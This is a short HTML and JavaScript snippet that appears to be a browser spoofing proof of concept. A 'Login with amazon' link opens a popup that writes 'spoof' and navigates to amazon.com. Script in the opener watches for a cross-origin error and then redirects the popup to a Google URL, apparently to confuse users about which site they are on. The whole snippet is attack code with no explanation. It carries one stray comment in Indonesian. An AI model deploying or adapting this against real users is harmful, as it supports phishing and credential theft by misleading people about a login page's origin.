<script>
  function next() {
         w.location.replace('http://www.google.com/csi');
        }

  function f() {
    w = window.open("javascript:setTimeout(function(){document.write('spoof');location='http://amazon.com'}, 50)","new","width=500 height=500");// Rest tetap sama dengan interval yang reasonable
    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
  }
</script>

<a href="#" onclick="f()">Login with amazon</a>